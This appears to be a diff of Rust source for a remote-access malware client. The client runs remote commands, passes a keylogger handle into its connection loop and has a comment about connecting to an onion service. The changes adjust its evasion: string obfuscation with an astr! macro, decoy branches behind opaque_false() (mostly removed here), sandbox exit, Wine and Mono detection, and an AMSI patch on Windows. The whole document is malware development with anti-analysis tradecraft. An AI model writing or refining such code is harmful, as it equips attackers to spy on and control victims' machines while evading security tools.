@@ -45,16 +45,16 @@ fn prefer_powershell() -> bool {
     use std::sync::OnceLock;
     static CACHE: OnceLock<bool> = OnceLock::new();
     *CACHE.get_or_init(|| {
-        std::process::Command::new("powershell.exe")
-            .args(["-NoProfile", "-Command", "gci"])
+        std::process::Command::new(astr!("powershell.exe"))
+            .args([astr!("-NoProfile"), astr!("-Command"), astr!("gci")])
             .output()
             .ok()
             .map(|o| {
                 let out = String::from_utf8_lossy(&o.stdout);
                 let err = String::from_utf8_lossy(&o.stderr);
                 !out.trim().is_empty()
-                    && !err.to_lowercase().contains("wine")
-                    && !out.to_lowercase().contains("mono")
+                    && !err.to_lowercase().contains(astr!("wine").as_str())
+                    && !out.to_lowercase().contains(astr!("mono").as_str())
             })
             .unwrap_or(false)
     })
@@ -131,12 +131,6 @@ fn get_username() -> String {
 
 /// Execute a command
 pub async fn run_command(input: &str) -> Result<Vec<u8>> {
-    cobl!({
-    if opaque_false() {
-        let _decoy = format!("{}{}", astr!("decoy"), astr!("command"));
-        return Ok(_decoy.into_bytes());
-    }
-
     let mut parts = input.trim().split_whitespace();
 
     let cmd = parts
@@ -467,7 +461,6 @@ Available commands:
             Ok(result)
         }
     }
-    })
 }
 
 /// Connect to onion service
@@ -484,12 +477,6 @@ pub async fn read_loop(
     stream: DataStream,
     keylogger: Arc<Mutex<keylogger::Keylogger>>,
 ) -> Result<bool> {
-    cobl!({
-    if opaque_false() {
-        let _junk = astr!("decoy_path");
-        return Ok(false);
-    }
-
     let (mut reader, mut writer) = split(stream);
 
     let mut buf = [0u8; 16384];
@@ -646,7 +633,6 @@ pub async fn read_loop(
             }
         }
     }
-    })
 }
 fn rand_range(min: u64, max: u64) -> u64 {
     use rand::Rng;
@@ -658,12 +644,6 @@ pub async fn netclient_run(
     config: ClientConfig,
     keylogger: Arc<Mutex<keylogger::Keylogger>>,
 ) -> Result<()> {
-    cobl!({
-    if opaque_false() {
-        let _dummy = rand_range(1, 5);
-        sleep(Duration::from_secs(_dummy)).await;
-    }
-
     loop {
         println!("{}", &astr!("Attempting to connect..."));
 
@@ -698,18 +678,9 @@ pub async fn netclient_run(
         );
         sleep(Duration::from_secs(delay)).await;
     }
-    Ok(())
-    })
 }
 
 async fn netclient_impl() -> c_int {
-    cobl!({
-    if opaque_false() {
-        println!("{}", astr!("Decoy init"));
-        std::thread::sleep(std::time::Duration::from_secs(1));
-        return 0;
-    }
-
     let startup_delay = rand_range(1, 13);
     println!(
         "{}{}{}",
@@ -726,10 +697,6 @@ async fn netclient_impl() -> c_int {
     }
 
     let _n_configs = configs.len();
-    if opaque_false() {
-        let _r = _n_configs.wrapping_mul(0xdeadbeef);
-        println!("{} {}", astr!("decoy"), _r);
-    }
 
     println!(
         "{}{}{}",
@@ -748,34 +715,25 @@ async fn netclient_impl() -> c_int {
         let _ = h.await;
     }
     0
-    })
 }
 pub async fn netclient() -> c_int {
     sandbox::exit_if_sandboxed();
 
-    cobl!({
-    if opaque_false() {
-        let _ = astr!("decoy");
-        return 1;
-    }
-
     #[cfg(target_os = "windows")]
     {
+        cobl!({
+        if opaque_false() {
+            return 1;
+        }
         let _ = amsi::patch_amsi();
+        })
     }
     netclient_impl().await;
     0
-    })
 }
 
 pub async fn netclient_dll() -> c_int {
     sandbox::exit_if_sandboxed();
-
-    cobl!({
-    if opaque_false() {
-        std::thread::sleep(std::time::Duration::from_secs(1));
-    }
     netclient_impl().await;
     0
-    })
 }
